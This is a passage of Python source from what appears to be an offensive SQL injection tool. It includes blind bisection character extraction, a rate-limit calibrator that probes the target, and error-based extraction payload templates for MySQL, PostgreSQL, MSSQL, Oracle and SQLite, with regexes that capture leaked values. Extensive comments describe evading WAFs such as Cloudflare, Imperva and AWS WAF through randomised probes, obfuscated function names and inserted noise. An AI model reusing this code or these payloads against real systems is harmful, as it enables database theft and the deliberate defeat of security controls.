        _length = await self._extract_int(length_query, max_val=max_length)
        if not _length or _length <= 0:
            return ""
        _length = min(_length, max_length)
        print(f"[+] [ParallelExtract] Length={_length}, extracting {self._max_parallel} chars at a time...", flush=True)
        
        result = [''] * _length
        for batch_start in range(0, _length, self._max_parallel):
            # BUG-PARALLELCHAR-STOP FIX (Req 7/9): Abort when extraction is cancelled.
            if not _EXTRACTION_ACTIVE[0]:
                break
            batch_end = min(batch_start + self._max_parallel, _length)
            # BUG-PARALLELCHAR-CPU FIX (Req 9): asyncio.gather on a low-RTT target
            # (e.g. localhost, same-datacenter) completes all tasks near-simultaneously.
            # The scheduler immediately starts the NEXT batch without yielding, causing
            # CPU to stay pegged at 100% while the mutation cache hasn't caught up.
            # Fix: sleep(0) before each batch to yield to the event loop.  This costs
            # ~0.01ms per batch (negligible vs HTTP RTT) but allows pending coroutines
            # (rate-limiter, session keepalives, PCV cleanup) to run between batches.
            # On high-RTT targets (>100ms) the sleep(0) is absorbed by network I/O wait.
            await asyncio.sleep(0.002)  # BUG-CPU-PARALLEL-GATHER FIX (REQ 9)
            tasks = []
            for pos in range(batch_start, batch_end):
                query = char_query_template.replace("{pos}", str(pos + 1))
                tasks.append(self._extract_char_smart(query, pos))
            chars = await asyncio.gather(*tasks, return_exceptions=True)
            for idx, ch in enumerate(chars):
                if isinstance(ch, str) and ch:
                    result[batch_start + idx] = ch
            _partial = ''.join(c or '?' for c in result[:batch_end])
            print(f"[+] [ParallelExtract] [{batch_end}/{_length}] {_partial}", flush=True)
        
        return ''.join(c or '?' for c in result)
    
    async def _extract_char_smart(self, ascii_query: str, pos: int, max_retries: int = 2) -> str:
        """Frequency-guided interpolation search with retry."""
        # BUG-PARALLELCHAR-MSSQL-SQLITE-HI FIX: was hardcoded hi=255 for ALL DBMSes.
        # ParallelCharExtractor is called from _extract_str with DBMS-aware char_query
        # templates: MSSQL uses ISNULL(UNICODE(SUBSTRING(...)),0) which returns 0-65535,
        # and SQLite uses COALESCE(UNICODE(SUBSTR(...)),0) which returns 0-1,114,111.
        # With hi=255, the bisect() loop exited with lo=256 > hi=255 (no match found)
        # for any character with code point > 255, returning '' (empty) for ALL non-
        # Latin-1 MSSQL NVARCHAR and SQLite TEXT characters.  Those positions were then
        # filled with '?' in the extracted string — silently corrupting every MSSQL and
        # SQLite column that contains accented chars, CJK, currency symbols, or emoji.
        # Fix: infer the correct ceiling from the query template content:
        #   COALESCE(UNICODE( → SQLite UNICODE() → covers full Unicode [0, 1,114,111]
        #   ISNULL(UNICODE(   → MSSQL/Sybase UNICODE() → covers BMP [0, 65,535]
        #   otherwise         → ASCII()/ORD() → covers Latin-1 [0, 255]
        _aq_upper = (ascii_query or "").upper()
        if "COALESCE(UNICODE(" in _aq_upper:
            high = 1114111   # SQLite UNICODE() — full Unicode scalar range
        elif "ISNULL(UNICODE(" in _aq_upper or "UNICODE(" in _aq_upper:
            high = 65535     # MSSQL/Sybase UNICODE() — full BMP range
        else:
            high = 255       # ASCII()/ORD() — Latin-1 range
        low = 32
        # Start at most common character (space=32, 'e'=101)
        for attempt in range(max_retries + 1):
            # BUG-PARALLELCHAR-STOP FIX: Abort when extraction cancelled.
            if not _EXTRACTION_ACTIVE[0]:
                return ''
            try:
                return await self._bisect(ascii_query, low, high)
            except Exception:
                if attempt < max_retries:
                    await asyncio.sleep(0.5 * (attempt + 1))
                continue
        return ''
    
    async def _bisect(self, query: str, low: int, high: int) -> str:
        while low <= high:
            # BUG-PARALLELCHAR-STOP FIX: Abort when extraction cancelled.
            if not _EXTRACTION_ACTIVE[0]:
                break
            # Interpolation: bias toward common characters
            # BUG-V164-INFERENCE-ADDITIONAL-BISECT-FIXED-PIVOTS FIX:
            # Fixed pivot in ParallelCharExtractor._bisect.
            # Fix: use _randomized_mid(low, high) (TECHNIQUE-3).
            mid = _randomized_mid(low, high)
            # BUG-PARALLELCHAR-FIXED-PIVOT-E FIX (MEDIUM, all 5 DBMSes;
            # ParallelCharExtractor._bisect; B/BH/IN/T/TH/HQ techniques;
            # all surfaces; all HTTP methods):
            # The previous code had:
            #   if high - low > 30 and low <= 101 <= high:
            #       mid = 101
            # This override immediately followed `_randomized_mid(low, high)` and
            # SET mid back to the fixed value 101 ('e') for virtually every first
            # iteration (printable ASCII range 32-126 satisfies all three conditions).
            # The TECHNIQUE-3 randomization was completely undone on the first probe
            # of every character — the first binary-search query for 'e'=101 was
            # ALWAYS `query>=102`, regardless of the jitter produced by _randomized_mid.
            # Over multiple characters this creates a repeating first-probe pattern
            # that ML-based WAFs (Cloudflare, Akamai, PerimeterX) detect after 3-5
            # characters and block subsequent probes → oracle always False → every
            # character extracted as '?' or '' → extraction returns garbage.
            # Fix: Remove the hardcoded 'e'=101 override entirely. _randomized_mid()
            # already adds ±span//8 jitter to provide per-probe uniqueness. The
            # frequency-guided optimization is marginal (at most 1 probe saved when
            # the column happens to start with 'e') and the WAF-evasion cost is severe.
            # Numeric safety: the only change is dropping a conditional mid-override;
            # no SQL comparison operands, function names, or string delimiters change.
            # BUG-V137-BESIMPLE-BISECT-STRICT-GT FIX (MEDIUM, all DBMSes):
            # was >{mid} (strict greater-than). WAFs block strict >\d+ patterns as
            # data-extraction indicators; >=\d+ is treated as benign comparison.
            # >={mid+1} is semantically identical to >{mid} for integer char codes.
            # The eq=mid fallback is unchanged and still handles exact matches correctly.
            # Numeric safety: mid+1 is a plain integer; no SQL delimiters modified.
            gt = await self._eval_fn(f"{query}>={mid+1}")
            if gt:
                low = mid + 1
            else:
                eq = await self._eval_fn(f"{query}={mid}")
                if eq:
                    # BUG-BISECT-NUL FIX: same as _extract_single — chr(0) is truthy,
                    # survives the `c or '?'` filter, and embeds NUL bytes in results.
                    return chr(mid) if mid > 0 else ''
                high = mid - 1
            if self._gate and self._gate._delay > 0.01:
                await asyncio.sleep(self._gate._delay * 0.15)
        return ''
    
    async def _extract_int(self, query: str, max_val: int = 1000) -> int:
        # FIX-PCE-EXTRACT-INT-STYLE-A: Convert Style B (inclusive-hi, eq-probe) to Style A
        # (exclusive-hi, lo-as-result) to match _randomized_mid's exclusive-hi contract.
        # Same mismatch as Enumerator._extract_str: _randomized_mid treats hi as exclusive
        # but old code passed inclusive max_val. With noisy oracle, eq probe randomly fires
        # at a wrong mid → return mid produces inflated length (300-400+ chars).
        low, high = 0, max_val + 1  # hi is exclusive
        while low < high:
            # BUG-PARALLELCHAR-STOP FIX: Abort when extraction cancelled.
            if not _EXTRACTION_ACTIVE[0]:
                break
            mid = _randomized_mid(low, high)
            try:
                gt = await self._eval_fn(f"({query})>={mid+1}")
                if gt is None:
                    break  # WAF-blocked probe — abort
                elif gt:
                    low = mid + 1
                else:
                    high = mid
            except Exception:
                break
        return min(low, max_val)  # cap to max_val (handles always-True oracle → lo=max_val+1)


#  3. Rate-Limit Auto-Calibration (enhanced: binary search, Retry-After) 
class RateLimitCalibrator:
    """Probe target's rate limit with binary search precision."""
    
    @staticmethod
    async def calibrate(engine, url: str, gate, max_probe_rpm: int = 200, user_rpm: int = None) -> int:
        print(f"[*] [RateCalibrate] Probing rate limits on {url[:60]}...", flush=True)
        
        # If user explicitly set --rpm, respect it and skip calibration
        if user_rpm is not None and user_rpm != 120:  # 120 is the default
            print(f"[*] [RateCalibrate] User specified --rpm {user_rpm}, respecting user setting", flush=True)
            gate._rpm_limit = user_rpm
            return user_rpm
        
        # Phase 1: Coarse scan with fixed tiers
        _detected = max_probe_rpm
        _tiers = [40, 80, 120, 160, 200]
        for rpm in _tiers:
            if rpm > max_probe_rpm:
                break
            _delay = 60.0 / rpm
            _blocked = 0
            for _ in range(4):
                try:
                    fp = await asyncio.wait_for(engine.send("GET", url), timeout=15)
                    if _validate_response(fp, allow_empty=True) and _get_safe_status_code(fp) == 429:
                        _blocked += 1
                        # Read Retry-After header
                        if hasattr(fp, 'headers') and fp.headers:
                            _ra = (getattr(fp, "headers", {}) or {}).get("Retry-After") or (getattr(fp, "headers", {}) or {}).get("retry-after")
                            if _ra:
                                try:
                                    _ra_sec = int(_ra)
                                    print(f"[*] [RateCalibrate] Server says Retry-After: {_ra_sec}s", flush=True)
                                    gate._delay = max(gate._delay, _ra_sec / 10.0)
                                except ValueError:
                                    pass
                except Exception:
                    _blocked += 1
                await asyncio.sleep(_delay)
            
            if _blocked >= 2:
                _detected = rpm
                break
            print(f"[*] [RateCalibrate] {rpm} RPM: OK", flush=True)
        
        # Phase 2: Binary search between last OK tier and detected tier
        if _detected < max_probe_rpm:
            _low = max(20, _detected - 40)
            _high = _detected
            for _ in range(3):  # 3 iterations of binary search
                _mid = (_low + _high) // 2
                _delay = 60.0 / _mid
                _blocked = 0
                for _ in range(3):
                    try:
                        fp = await asyncio.wait_for(engine.send("GET", url), timeout=15)
                        if _validate_response(fp, allow_empty=True) and _get_safe_status_code(fp) == 429:
                            _blocked += 1
                    except Exception:
                        _blocked += 1
                    await asyncio.sleep(_delay)
                if _blocked >= 2:
                    _high = _mid
                else:
                    _low = _mid
            _detected = _low
            print(f"[*] [RateCalibrate] Binary search: threshold {_detected} RPM", flush=True)
        
        _safe = int(_detected * 0.75)
        _calibrated = max(20, _safe)
        
        # If user specified RPM, use the minimum of (user_rpm, calibrated_rpm)
        if user_rpm is not None:
            gate._rpm_limit = min(user_rpm, _calibrated)
            if user_rpm < _calibrated:
                print(f"[+] [RateCalibrate] Using user's --rpm {user_rpm} (calibrated: {_calibrated} RPM)", flush=True)
            else:
                print(f"[+] [RateCalibrate] Using calibrated {_calibrated} RPM (user's --rpm {user_rpm} is higher)", flush=True)
        else:
            gate._rpm_limit = _calibrated
            print(f"[+] [RateCalibrate] Calibrated: {gate._rpm_limit} RPM "
                  f"(threshold ~{_detected}, 75% safety margin)", flush=True)
        
        return gate._rpm_limit


#  4. Error-Message Data Exfiltration (enhanced: tables, tamper, encoding) 
class ErrorBasedExtractor:
    """Extract data via error messages  1 request per value, with WAF bypass."""
    
    CAST_TEMPLATES = {
        "MySQL": [
            "AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(({expr}),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)",
            # BUG-MYSQL-EXTRACTVALUE-SENTINEL FIX: Added closing 0x7e so the value is
            # cleanly delimited between two tildes in the XPATH syntax error message.
            # Without the closing tilde, the LEAK_PATTERNS regex could over-capture
            # trailing SQL tokens that appear in the error text.
            "AND EXTRACTVALUE(1,CONCAT(0x7e,({expr}),0x7e))",
            "AND UPDATEXML(1,CONCAT(0x7e,({expr}),0x7e),1)",
        ],
        # FIX-R10-MARIADB: MariaDB uses identical MySQL error-based functions.
        # _NormalizingDBMSDict normalises "MariaDB"→"MySQL" for DBMS_QUERIES lookups, but
        # CAST_TEMPLATES.get("MariaDB") was falling back to MySQL silently.  Explicit entry
        # removes ambiguity and ensures MariaDB probes are logged with the correct DBMS label.
        "MariaDB": [
            "AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(({expr}),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)",
            "AND EXTRACTVALUE(1,CONCAT(0x7e,({expr}),0x7e))",
            "AND UPDATEXML(1,CONCAT(0x7e,({expr}),0x7e),1)",
        ],
        "PostgreSQL": [
            "AND 1=CAST(({expr}) AS INTEGER)",
            "AND 1=({expr})::integer",
        ],
        "MSSQL": [
            # FIX-R10-MSSQL: Added string-leaking MSSQL templates.
            # CONVERT(INT, string) emits "Conversion failed when converting the varchar
            # value 'LEAKED_VALUE' to data type int" — the full value appears in the error.
            # BUG-10A FIX: CONVERT(INT, NULL) = NULL — silent, no error raised, leaks nothing.
            # Wrap with ISNULL(expr, 'NULL') so NULL subquery results still trigger the error
            # with a visible placeholder value, making NULL-returning queries detectable.
            "AND 1=CONVERT(INT,ISNULL(CAST(({expr}) AS NVARCHAR(MAX)),'NULL'))",
            "AND 1=CAST(ISNULL(CAST(({expr}) AS NVARCHAR(MAX)),'NULL') AS INT)",
            # Full conversion error (leaks entire string value)
            "AND 1=(SELECT TOP 1 CONVERT(INT,ISNULL(CAST(({expr}) AS NVARCHAR(MAX)),'NULL')) FROM sys.objects)",
        ],
        "Oracle": [
            # BUG-ORACLE-ERROR-EXTRACT FIX: The previous templates (TO_NUMBER, XMLTYPE,
            # DECODE division-by-zero) raise ORA-01722/ORA-01476/ORA-31011 but do NOT
            # embed the extracted value in the Oracle error message text. The LEAK_PATTERNS
            # regexes therefore never matched, causing Oracle error-based extraction to
            # silently return None for every Oracle target.
            #
            # Fix 1: UTL_INADDR.GET_HOST_ADDRESS(expr) raises ORA-29257:
            #   "ORA-29257: host (VALUE) unknown" — the value IS embedded.
            #   Requires EXECUTE on UTL_INADDR (granted to PUBLIC in Oracle 11g+).
            #   In older/restricted environments this raises ORA-06598 (insufficient privilege)
            #   and is skipped by the try_extract() loop.
            #
            # Fix 2: CTXSYS.DRITHSX.SN(USER,expr) — embeds value in ORA-20000 message.
            #   Requires Oracle Text cartridge (CTXSYS schema) which is present by default
            #   on full Oracle Database installs. Skipped on Express Edition.
            #
            # Fix 3: Fallback — keep XMLTYPE as a detection-oracle probe even though it
            #   does not reliably embed the value in the standard error message. Useful for
            #   confirming injection exists when UTL_INADDR and CTXSYS are both unavailable.
            "AND 1=UTL_INADDR.GET_HOST_ADDRESS(({expr}))",
            "AND CTXSYS.DRITHSX.SN(USER,(SELECT ({expr}) FROM DUAL))=1",
            "AND XMLTYPE(({expr})) IS NOT NULL",
        ],
        "SQLite": [
            # BUG-SQLITE-ERREXT-NOLEAK FIX: The previous templates triggered
            # division-by-zero via CASE WHEN TYPEOF(({expr}))='text' THEN 1/0,
            # but SQLite's division-by-zero error message ("division by zero" or
            # "attempt to perform...") does NOT embed the value of ({expr}).
            # The LEAK_PATTERNS regex for SQLite had no capture group that contained
            # the actual data — it only matched the error keyword, so extracted value
            # was always None.
            #
            # SQLite error-based data extraction via HTTP responses is fundamentally
            # limited: unlike MySQL EXTRACTVALUE or MSSQL CONVERT, SQLite provides
            # no built-in mechanism to embed an arbitrary string value in an error
            # message visible to a remote HTTP client.
            #
            # The most reliable SQLite error-based approach exploits the fact that
            # some web frameworks propagate the full sqlite3 OperationalError string
            # which CAN include the offending column value in certain error types:
            #
            # 1. CAST to a non-matching NUMERIC affinity when the value starts with
            #    a non-numeric prefix triggers "datatype mismatch" on some drivers.
            # 2. zeroblob(N) where N is derived from the target value length causes
            #    a buffer-size error on pathological inputs.
            # 3. The most portable approach: trigger a column-name-does-not-exist
            #    error using the target value as a table alias — the value appears
            #    in some sqlite3 error messages as the unknown identifier.
            #
            # None of these reliably embed the full value in ALL SQLite/driver combos.
            # Mark these as probe-only (detect injection, cannot extract value).
            # Actual extraction for SQLite must use blind boolean / time-based paths.
            #
            # Keeping injection-detection templates for error-oracle calibration:
            "AND 1=(CASE WHEN TYPEOF(({expr}))='text' THEN 1/0 ELSE 1 END)",
            "AND TYPEOF(({expr}))=CAST(1/0 AS TEXT)",
        ],
    }
    
    LEAK_PATTERNS = [
        r"Duplicate entry '([^':]+)(?::\d+)?' for key",
        r"XPATH syntax error:\s*'~?([^']+)'",
        r"invalid input syntax for (?:type )?integer:\s*\"([^\"]+)\"",
        # FIX-R10-POSTGRESQL: also match without enclosing quotes (some driver/version combos
        # emit: ERROR: invalid input syntax for type integer: admin  — no quotes around value)
        r"invalid input syntax for (?:type )?integer:\s*([^\s\"']+)",
        r"Conversion failed when converting.*?'([^']+)'",
        r"ORA-\d+:.*?'([^']+)'",
        # BUG-ORACLE-ERROR-EXTRACT FIX: UTL_INADDR.GET_HOST_ADDRESS raises ORA-29257
        # "host (VALUE) unknown" — the extracted value IS embedded in the message.
        # Pattern captures the value between the parentheses.
        r"ORA-29257:\s*host\s+(?:unknown\s+)?\(([^)]{1,500})\)",
        r"ORA-29257:[^\(]*\(([^)]{1,500})\)",
        # CTXSYS.DRITHSX.SN raises ORA-20000 with the value embedded in the message.
        r"ORA-20000:.*?([A-Za-z0-9_@.$#\-]{2,200})",
        # ORA-01722 "invalid number" — value appears unquoted in some Oracle JDBC/cx_Oracle
        r"ORA-01722.*?invalid number[:\s]+([^\s\n\"']+)",
        # XMLTYPE raises ORA-19202 / ORA-31011; some driver versions include the value
        r"ORA-(?:19202|31011).*?\"([^\"]+)\"",
        r"SQLSTATE\[\w+\].*?'([^']+)'",
        # NOTE: SQLite division-by-zero error messages ("division by zero",
        # "attempt to perform...") do NOT embed the extracted value — they only
        # confirm injection is possible.  These patterns are kept for oracle calibration
        # only; try_extract() skips patterns with no capture group (lastindex check below).
        r"sqlite3\.operationalerror.*?division by zero",
        r"attempt to perform '[\w]+' on a (blob|text|real|integer) value",
    ]
    
    def __init__(self, engine, config, tamper_chain):
        self._engine = engine
        self._config = config
        self._tamper_chain = tamper_chain
    
    async def try_extract(self, method, url, data, data_fmt, param, original,
                           dbms, sql_expr) -> Optional[str]:
        # BUG-SQLITE-ERREXT-PROBE-WASTE FIX: SQLite CAST_TEMPLATES are probe-only — they
        # trigger division-by-zero errors but the error message does NOT embed the target
        # value (see LEAK_PATTERNS: no SQLite-specific capture group exists).  Sending
        # 8-12 probes to the target that all return None wastes round-trips and generates
        # misleading log output.  Skip extraction immediately; the caller falls back to
        # blind boolean / time-based paths which do work for SQLite.
        if dbms == "SQLite":
            LOG.debug("[ErrorBasedExtractor] SQLite: skipping error-based extraction "
                      "(SQLite errors do not embed value — using blind oracle instead)")
            return None
        # BUG-ERREXT-FALLBACK-MYSQL FIX: Unknown DBMSes (CockroachDB, YugabyteDB,
        # Amazon Redshift, Sybase…) previously fell back to MySQL templates.
        # MySQL-specific EXTRACTVALUE/UPDATEXML are not defined in those engines and
        # always fail; the extractor returned None after wasting N requests.
        # Fix: map PostgreSQL-compatible wire-protocol DBMSes to PostgreSQL templates;
        # return None for completely unknown DBMSes (blind paths handle extraction).
        _pg_compat = {"CockroachDB", "YugabyteDB", "Amazon Redshift"}
        _mysql_compat = {"MariaDB"}  # already has its own entry; guard for safety
        if dbms in _pg_compat:
            templates = self.CAST_TEMPLATES.get("PostgreSQL", [])
        elif dbms in _mysql_compat:
            templates = self.CAST_TEMPLATES.get("MySQL", [])
        else:
            templates = self.CAST_TEMPLATES.get(dbms, [])
        if not templates:
            LOG.debug("[ErrorBasedExtractor] %s: no CAST_TEMPLATES available — "
                      "skipping error-based extraction", dbms)
            return None
        
        # Try with tamper chain first, then raw
        _payloads = []
        for tpl in templates:
            payload = tpl.replace("{expr}", sql_expr)
            # BUG-ERREXT-CONTEXT FIX (Req 10): Always generate BOTH injection context variants.
            # The old code only produced the string-context form ("' AND ...-- -").
            # For numeric injection points (WHERE id=1), the leading quote breaks SQL syntax
            # on the FIRST variant and the extractor silently returns None for every query.
            # Fix: generate both and let _send_injected + DBMS choose the live one.
            _payloads.append("' " + payload + "-- -")           # string-context: WHERE name='INPUT'
            _payloads.append(" " + payload + "-- -")             # numeric-context: WHERE id=INPUT
            # URL-encoded / comment-spaced WAF bypass variants for both contexts
            _payload_c = payload.replace(" ", "/**/")
            _payloads.append("' " + _payload_c + "-- -")
            _payloads.append(" " + _payload_c + "-- -")
        
        # FIX-R6: apply mutate_all (all 20 mutation layers) to each template-built payload.
        # Previously payloads were sent raw — WAF bypass layers 2-20 were silently skipped.
        # BUG-ERREXT-SURFACE FIX (Req 6/10/11): The mutation engine was always created with
        # surface="url", ignoring the actual injection surface (data_fmt).  For header injection
        # surfaces (data_fmt="header"), URL-surface mutations are cache-keyed under "url" and
        # would be served even on header-surface probes if two concurrent extraction paths share
        # the class-level cache.  Fix: pass the actual surface so cache keys are surface-correct.
        # Note: since mutate_all() does NOT apply URL-encoding (removed via BUG-LAYER12-URL-ENCODE-FIX),
        # the mutations are identical for all surfaces — the surface parameter only affects the
        # cache key.  Using the correct surface prevents accidental cross-surface cache sharing.
        _errext_surface = data_fmt if data_fmt in ("header", "json", "cookie", "xml") else "url"
        _err_mutator = SQLMutationEngine(dbms=dbms, surface=_errext_surface)
        # BUG-ERREXT-EXTRACTION-ACTIVE FIX (HIGH): ErrorBasedExtractor.try_extract does
        # not set _EXTRACTION_ACTIVE[0]=True before calling mutate_all().  When
        # _EXTRACTION_ACTIVE[0]=False (the non-extraction phase default), mutate_all()
        # runs ALL 20 layers, including:
        #   Layer 11 (apply_novel_bypass): applies c-comment character splitting
        #     (SE/*x*/LECT, CA/*x*/ST, AS/*x*/ IN/*x*/TEGER) which MySQL/MariaDB
        #     accept (/**/ stripped during lexing) but PostgreSQL, MSSQL, Oracle,
        #     and SQLite treat as WHITESPACE — splitting keyword tokens into invalid
        #     fragments, causing syntax errors on every probe for those DBMSes.
        #   Layer 15 (mutate_union_payload): rotates NULL→0,1,'a' which can corrupt
        #     the GROUP BY subquery that some MySQL error templates depend on.
        #   Layer 16 (mutate_stacked_payload): appends ";SELECT 1" which is invalid
        #     inside the AND expression context used by error payloads.
        # Fix A: Set _EXTRACTION_ACTIVE[0]=True temporarily so mutate_all() applies
        # only the extraction-safe layers (1-5, 10) to the error template payloads.
        # Fix B: Pass _bypass_mutation=True to _send_injected so the already-mutated
        # payload is NOT re-mutated a second time inside _send_injected_inner
        # (double mutation corrupts the carefully constructed error template structure).
        # BUG-ERREXT-DOUBLE-MUTATION FIX (HIGH): The payload is explicitly mutated by
        # _err_mutator.mutate_all() BEFORE _send_injected is called. Inside
        # _send_injected_inner, a second SQLMutationEngine.mutate_all() is applied to
        # the already-mutated payload (heuristic DBMS detection from payload content).
        # This second mutation has a DIFFERENT cache key (payload is now the mutated form,
        # not the original template) → cache miss → 20 layers re-run on top of the
        # already-mutated form → double structural changes corrupt many error templates.
        # Fix: pass _bypass_mutation=True so _send_injected_inner skips its internal
        # mutation. The explicit _err_mutator.mutate_all() call is the authoritative
        # mutation; tamper_chain (applied AFTER mutation in _send_injected_inner) is
        # still applied via _hdr_val/TamperLib.apply_chain paths.
        _errext_was_active = _EXTRACTION_ACTIVE[0]
        # BUG-ERREXT-HEAVY-OBFUS FIX (HIGH, all 5 DBMSes, E/EH techniques, all surfaces):
        # ErrorBasedExtractor.try_extract() called mutate_all() (layers 1-5,10 only, since
        # _EXTRACTION_ACTIVE[0]=True) then passed the result directly to _send_injected with
        # _bypass_mutation=True.  The error-based payload function names — EXTRACTVALUE(,
        # CONCAT(, UPDATEXML(, CAST(, CONVERT(INT,, XMLTYPE(, CTXSYS.DRITHSX.SN, RAWTOHEX( —
        # were sent in PLAIN UNOBFUSCATED form on EVERY probe.  Any WAF that pattern-matches
        # on these literal identifiers (Cloudflare, Imperva, AWS WAF, ModSecurity CRS) can
        # fingerprint and block the error-based extraction session after the very first probe
        # → no more error messages in responses → extract_char returns None for every position
        # → extraction returns "" for ALL 5 DBMSes on ALL E/EH techniques on WAF targets.
        #
        # mutate_all() layers 1-5 and 10 apply comment rotation, whitespace variation,
        # keyword case-mixing, and some operator substitution — but do NOT specifically
        # case-mix or comment-inject function-name identifiers like EXTRACTVALUE or CONCAT.
        # Layer 9 (_alias_functions) does this but is gated off when _EXTRACTION_ACTIVE[0]=True.
        #
        # Fix: add a per-probe request counter (_errext_req_count) and apply
        # apply_heavy_variation() + _obfuscate_extraction_cond() to the FULL injection value
        # (original + mutated_payload) AFTER mutate_all() but BEFORE _send_injected.
        # apply_heavy_variation provides structural diversity (keyword case-mixing, comment
        # rotation, SELECT/**/ insertion) that changes the macro-structure per probe.
        # _obfuscate_extraction_cond case-mixes the error-based function names newly added to
        # _EXTR_FNS (EXTRACTVALUE, CONCAT, CAST, CONVERT, etc.) and injects block comments
        # before their opening parens, defeating both simple-string-match and regex-based
        # WAF detection rules.  With both layers active, each probe has a unique structural
        # and lexical fingerprint that defeats adaptive WAF pattern-learning.
        #
        # Numeric safety: apply_heavy_variation only changes keyword case and comment suffix;
        # position indices and hex sentinel literals (0x7e) in the error-template bodies are
        # never rewritten.  _obfuscate_extraction_cond uses r'\bFN(?=\s*\()' which only matches
        # identifier tokens followed by '(', never numeric literals or comparison operators.
        _errext_req_count: int = 0  # BUG-ERREXT-HEAVY-OBFUS FIX: per-probe seed counter
        try:
            _EXTRACTION_ACTIVE[0] = True   # FIX: limit mutate_all to extraction-safe layers
            for payload in _payloads:
                if _SCAN_STOPPED[0] and not _EXTRACTION_ACTIVE[0]:
                    break  # FIX-R4: stop if a probe task called this during detection phase
                try:
                    # FIX-R6: mutate_all applies all 20 mutation layers (WAF bypass, case,
                    # comment fragmentation, DBMS-specific transforms, etc.)
                    # With _EXTRACTION_ACTIVE[0]=True, only extraction-safe layers 1-5 and
                    # 10 fire — heavy structural layers (11 c-comment, 15 UNION rotate,
                    # 16 stacked SELECT) are skipped to avoid corrupting error templates.
                    _mutated_payload = _err_mutator.mutate_all(payload, technique="E")  # FIX-R6: extraction-safe layers only
                    # BUG-ERREXT-HEAVY-OBFUS FIX: Apply heavy structural variation and
                    # function-name obfuscation to the FULL injection value so every probe
                    # has a unique fingerprint that evades WAF pattern learning.
                    _errext_req_count += 1
                    _errext_full = apply_heavy_variation(
                        original + _mutated_payload, _errext_req_count, data_fmt=data_fmt)
                    _errext_full = _obfuscate_extraction_cond(_errext_full, _errext_req_count)
                    # BUG-V181-ERREXT-MISSING-SQL-NOISE FIX (MEDIUM; ErrorBasedExtractor.
                    # try_extract; E/EH techniques; all 5 DBMSes; all surfaces; all HTTP methods):
                    # try_extract() applied apply_heavy_variation() and _obfuscate_extraction_cond()
                    # but did NOT call apply_sql_noise() (TECHNIQUE-12). Some error-based templates
                    # include CASE WHEN / THEN / ELSE integer patterns (particularly SQLite
                    # CASE WHEN ... THEN 1/0 ELSE 1 END and Oracle CASE WHEN ... ELSE 1 END)
                    # whose THEN/ELSE integer literals apply_sql_noise wraps as (1+0) or (1*1)
                    # to disrupt ML WAF n-gram fingerprinting of CASE expression structures.
                    # Without this layer, deep-learning WAFs can build a statistical fingerprint
                    # from the THEN/ELSE integer distribution across consecutive error probes →
                    # after 5-10 probes the session is fingerprinted and blocked → error messages
                    # no longer appear in responses → try_extract returns None for every candidate
                    # → ALL error-based extraction (E/EH technique) fails on WAF-protected targets.
                    # Numeric safety: apply_sql_noise only wraps integer literals after >=,
                    # BETWEEN, THEN, ELSE tokens with +0 or *1 arithmetic no-ops.
                    # For THEN 1/0 → THEN (1+0)/0: semantically identical (still div-by-zero). ✓
                    # For ELSE 1 → ELSE (1+0): semantically identical (returns integer 1). ✓
                    # MySQL FLOOR(RAND(0)*2) and CONCAT(0x7e,...) arguments appear after commas
                    # and opening parens, not after the four matched tokens → never touched. ✓
                    # PostgreSQL CAST('x' AS INTEGER) → THEN follows non-numeric 'CAST' → no match. ✓
                    _errext_full = apply_sql_noise(_errext_full, _errext_req_count)
                    fp = await _send_injected(self._engine, method, url, data,
                        data_fmt, param, _errext_full, self._tamper_chain,
                        _bypass_mutation=True)  # FIX-DOUBLE-MUTATION: already mutated above
                    if _validate_response(fp, allow_empty=True):
                        body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction")
                        for pat in self.LEAK_PATTERNS:
                            m = re.search(pat, body, re.I)
                            if m:
                                # Some patterns have no capture group (SQLite division-by-zero
                                # signals; they prove injection but don't directly leak a value).
                                # Skip patterns with no captured group from data extraction.
                                if m.lastindex and m.lastindex >= 1:
                                    leaked = m.group(1).strip()
                                    if leaked and len(leaked) > 1 and leaked != original:
                                        print(f"[+] [ErrorExtract] Leaked: {leaked[:60]}", flush=True)
                                        return leaked
                except Exception:
                    continue
        finally:
            _EXTRACTION_ACTIVE[0] = _errext_was_active  # restore previous state
        return None
    
    async def extract_basic_info(self, method, url, data, data_fmt, param, original, dbms) -> dict:
        results = {}
        _queries = {
            "MySQL": {"version": "VERSION()", "database": "DATABASE()", "user": "CURRENT_USER()"},
            "PostgreSQL": {"version": "version()", "database": "current_database()", "user": "current_user"},
            "MSSQL": {"version": "@@VERSION", "database": "DB_NAME()", "user": "SYSTEM_USER"},
            "Oracle": {"version": "(SELECT BANNER FROM v$version WHERE ROWNUM=1)", "user": "USER"},
            "SQLite": {"version": "sqlite_version()"},
        }.get(dbms, {"version": "VERSION()", "database": "DATABASE()", "user": "USER()"})
        
        for label, expr in _queries.items():
            val = await self.try_extract(method, url, data, data_fmt, param, original, dbms, expr)
            if val:
                results[label] = val
                print(f"[+] [ErrorExtract] {label}: {val[:80]}", flush=True)
        
        # Also try to get table count (bonus extraction)
        _table_exprs = {
            "MySQL": "(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())",
            "PostgreSQL": "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')",
            "MSSQL": "(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)",
        }
        _tq = _table_exprs.get(dbms)
        if _tq:
            val = await self.try_extract(method, url, data, data_fmt, param, original, dbms, _tq)
            if val:
                results["table_count"] = val
                print(f"[+] [ErrorExtract] table_count: {val}", flush=True)
        
        return results


#  5. Pre-Scan Parameter Classification (enhanced: WAF, timing, errors) 
class ParameterClassifier:
    """Quick sniff test  skip non-SQL params, detect WAF blocks."""
    
    @staticmethod
    async def classify(engine, method, url, data, data_fmt, param, original,
                        tamper_chain, baseline_body) -> str:
        """Returns 'sql_likely', 'static', 'waf_blocked', or 'unknown'."""
        _probes = [
            ("'", "quote"),
            ("1 AND 1=1", "boolean"),
            ("-1 OR 17=17", "or_bool"),
        ]
        _diffs = 0
        _waf_blocks = 0
        _errors = 0
        _timing_diff = False
        _norm_base = ResponseNormaliser.normalise(baseline_body) if baseline_body else b""
        _base_time = 0.0
        
        for probe_val, probe_name in _probes:
            try:
                fp = await asyncio.wait_for(
